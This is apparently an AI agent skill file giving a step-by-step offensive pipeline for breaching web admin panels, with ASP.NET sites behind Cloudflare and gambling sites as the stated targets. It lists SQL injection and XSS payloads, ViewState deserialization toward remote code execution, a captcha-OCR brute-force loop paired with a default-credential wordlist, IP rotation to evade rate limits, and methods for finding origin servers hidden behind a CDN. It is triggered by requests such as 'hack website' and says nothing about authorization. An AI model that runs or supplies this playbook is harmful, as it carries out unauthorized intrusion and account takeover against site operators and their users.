
# Full-Spectrum Web Attack — Recon to Admin Breach

A complete offensive pipeline for hardened web applications: recon, auth bypass,
injection, ViewState chaining, origin IP hunting, and captcha brute force.
Designed for ASP.NET/Cloudflare targets but portable. Does NOT cover smart
contracts or mobile apps.

## When to Use

- "serang admin panel"
- "brute force admin"
- "exploit admin"
- "hack website"
- "breach website"
- "crack admin login"
- "full spectrum attack"

## Prerequisites

```bash
pip3 install --quiet dnspython requests Pillow pytesseract
```

- `curl`, `dig`, `whois` — usually pre-installed on Linux
- `tesseract-ocr` for captcha OCR: `apt-get install -y tesseract-ocr`
- Optional: CapSolver/2captcha API key for captcha solving

## How to Run

Invoke each phase through the `terminal` tool using `execute_code` for multi-step
Python scripts, or `browser_navigate` + `browser_type` for browser-based attacks.

## Quick Reference

| Phase | Tool | Purpose |
|-------|------|---------|
| DNS | `dig +short A/MX/NS/TXT TARGET` | Infrastructure mapping |
| Subdomain | `crt.sh`, `HackerTarget`, `Shodan InternetDB` | Asset discovery |
| Headers | `curl -sk -D- https://TARGET` | Tech stack + WAF detection |
| Paths | `curl -sk -o /dev/null -w '%{http_code}'` | Sensitive file discovery |
| SQLi | `' OR 1=1--`, `' UNION SELECT...` | Auth bypass / data exfil |
| XSS | `<script>`, `"><script>`, `onfocus=` | Client-side injection |
| SSTI | `{{7*7}}`, `@{2+2}`, `${7*7}` | Template injection |
| ViewState | `base64` decode + byte 0 check | Deserialization check |
| Captcha | Pillow + tesseract + solver API | Automated solving |
| Origin | Shodan, SecurityTrails, Censys, MX/SPF | IP behind CDN |
| Browser | `browser_navigate`, `browser_type`, `browser_vision` | JS-rendered attacks |

## Procedure

### Phase 1: Reconnaissance

1. **DNS enumeration** — `dig +short A`, `AAAA`, `MX`, `NS`, `TXT`, `SOA` for the target.
2. **WHOIS** — `whois TARGET` for registrar, nameservers, creation date.
3. **HTTP headers** — `curl -sk -D- -L https://TARGET/` for `server`, `x-powered-by`,
   `cf-ray` (Cloudflare), `set-cookie`, `x-frame-options`, CSP.
4. **Tech stack fingerprint** — `X-Powered-By: ASP.NET`, `Server: cloudflare`,
   `Set-Cookie: ASP.NET_SessionId` → ASP.NET WebForms + IIS + Cloudflare.
5. **Subdomain enumeration** — `crt.sh` JSON/HTML, `HackerTarget` hostsearch API,
   `Shodan InternetDB`. Look for `m.`, `wap.`, `admin.`, `api.`, `dev.`, `staging.`.
6. **Sensitive path scan** — `/.env`, `/.git/HEAD`, `/web.config`, `/admin`,
   `/phpmyadmin`, `/pma`, `/elmah.axd`, `/trace.axd`, `/robots.txt`, `/sitemap.xml`.
   On ASP.NET: also check `.axd`, `.ashx`, `.aspx` paths.
7. **S3/CDN bucket check** — `x-amz-bucket-region` header reveals region.
   CloudFront distributions: try `https://DISTRIBUTION.cloudfront.net/`.

### Phase 2: Authentication Surface

1. **Map login forms** — extract all `<input>` names, `__VIEWSTATE`,
   `__VIEWSTATEGENERATOR`, `__EVENTVALIDATION` hidden fields.
2. **Check for WAP/mobile login** — `wap.TARGET` or `m.TARGET` often has no captcha
   or weaker auth. Check for WML forms (`<go method="post" href="Login.aspx">`).
3. **Register bypass** — if captcha validation is client-side, submit with empty
   captcha field. ASP.NET WebForms register may accept empty captcha.
4. **Verify registration** — re-register same username. If "already exists" appears
   in JS but second registration succeeds → registration is DUMMY.
5. **Session predictability** — request 5 sessions, check if `ASP.NET_SessionId` is
   sequential or predictable.

### Phase 3: Injection Attacks

1. **SQLi on login** — payloads: `' OR '1'='1' --`, `' OR 1=1--`, `admin'--`,
   `' UNION SELECT 1,2,3,4,5,6--`, `'; WAITFOR DELAY '0:0:5'--`.
   Check for SQL errors: `SqlException`, `Incorrect syntax`, `unclosed quotation`.
2. **SQLi on WAP** — WAP/WML forms often have no parameterized queries.
3. **XSS** — test all reflected fields with `"><script>alert(1)</script>`,
   `" onfocus="alert(1)" autofocus="true" x="`, `</option></select><img src=x onerror=alert(1)>`.
   ASP.NET typically HTML-encodes → `&quot;`, `&lt;`, `&#39;`.
4. **SSTI** — `{{7*7}}` (Jinja2/Twig), `@{2+2}` (Razor), `${7*7}` (Freemarker).
   Check if evaluated to 49/4, or just reflected verbatim.

### Phase 4: ViewState Manipulation

1. **Extract ViewState** — from `name="__VIEWSTATE" value="..."`.
2. **Decode base64** — `base64.b64decode(viewstate)`.
3. **Check first byte**:
   - `0xFF` → encrypted with SHA1/HMAC (safest)
   - `0x01` → MAC protected, not encrypted
   - `0x87` → MAC + encrypted (most secure)
   - `0x15` → UNENCRYPTED — MAC disabled, deserialization attack possible!
4. **If unencrypted** — use `ysoserial.net` or similar for .NET deserialization RCE.

### Phase 5: Captcha Brute Force

1. **Download captcha** — use same cookie jar as the page that generated it.
   `curl -sk -b cookies.txt https://TARGET/captchaimg -o captcha.png`.
2. **OCR with tesseract** — resize to 5x, grayscale, try multiple thresholds (80-200),
   both normal and inverted. PSM modes 6, 7, 8. Use `tessedit_char_whitelist=0123456789`.
3. **Solver API** — if available, submit base64 to CapSolver/2captcha as
   `ImageToTextTask` with `numeric: 1`, `minLength: 3`, `maxLength: 3`.
4. **ViewState chaining** — extract NEW ViewState from each response body and use it
   for the next request. This prevents session expiry.
5. **Brute force loop** — for each captcha value (000-999), pair with credential
   wordlist. Check for `logout` in response body as success indicator.
6. **Credential wordlist for gambling sites** — `admin:admin`, `admin:admin123`,
   `admin:paris88`, `admin:admin888`, `operator:operator`, `paris88:paris88`,
   `superadmin:superadmin`.

### Phase 6: Origin IP Hunting

1. **Check Shodan InternetDB** — `https://internetdb.shodan.io/IP` for open ports,
   hostnames, CPEs, and whether it's Cloudflare.
2. **Check MX/SPF records** — `dig +short MX TARGET` — mail servers often reveal
   origin IPs.
3. **Check SecurityTrails** — DNS history for non-Cloudflare IPs.
4. **Check Censys** — certificate search for the domain.
5. **Reverse DNS** — `socket.gethostbyaddr(ip)` for PTR records.
6. **Try Host header bypass** — `curl -H 'Host: TARGET' http://IP/` on candidate
   IPs to see if origin responds.
7. **Try common hosting ports** — `:2082`, `:2083`, `:2086`, `:2087`, `:8443`,
   `:8880`, `:8080`, `:2222`, `:10000`.
8. **Check for Cloudflare Tunnel** — if all IPs are Cloudflare (104.x, 172.6x.x)
   and no non-CF IPs found → origin is behind CF Tunnel/Argo.

### Phase 7: Browser-Based Attack

When `curl` is blocked by Cloudflare/WAF or captcha is too complex:

1. `browser_navigate` to the target URL.
2. `browser_type` to fill username and password fields.
3. `browser_vision` to capture the page with captcha for manual reading.
4. `browser_get_images` to find captcha image URL.
5. `browser_click` to submit the form.

## Pitfalls

- **ViewState expires per request** — you MUST extract new ViewState from each
  response body and chain it, or the captcha will always be "invalid".
- **Cloudflare Rate Limiting** — 0-byte responses (HTTP 520) mean you're being
  throttled. Slow down or rotate IPs.
- **ASP.NET auto-encodes XSS** — `&quot;`, `&lt;`, `&#39;` are standard. Only
  exploitable if output is NOT in an HTML context (e.g., JS, attribute without
  quotes, or `@Html.Raw()`).
- **WAP login is often dummy** — many sites have WAP endpoints that return the
  same page regardless of credentials. Verify by comparing responses.
- **Registration may be dummy** — always re-register the same username to verify.
- **Captcha OCR accuracy** — 70×30px captchas are too small for reliable OCR.
  API solvers also struggle. Manual reading is the most reliable fallback.
- **crt.sh JSON frequently fails** — fall back to HTML parsing or HackerTarget.
- **Cloudflare hides origin** — IPs from Shodan are Cloudflare's, not origin.
  Use DNS history, MX records, or certificate transparency for origin discovery.

## Verification

After a successful login, the response body contains `logout` in the HTML
(indicating an authenticated session), and the page shows member-specific
content (saldo, balance, deposit, withdraw, member area).